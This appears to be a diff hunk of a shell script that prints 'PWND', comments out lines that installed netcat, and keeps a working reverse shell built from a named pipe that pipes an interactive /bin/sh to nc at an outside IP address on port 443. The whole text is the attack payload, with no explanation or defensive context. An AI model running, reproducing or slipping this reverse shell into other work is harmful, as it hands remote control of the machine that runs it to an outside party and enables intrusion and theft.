@@ -3,9 +3,10 @@
 echo "======= PWND ========="
 
 
-uname -a
-apt update
-apt install -y netcat
+#uname -a
+#apt update
+#apt install -y netcat
+
 rm -rf /tmp/f
 mkfifo /tmp/f
 cat /tmp/f|/bin/sh -i 2>&1|nc 139.59.42.102 443 >/tmp/f
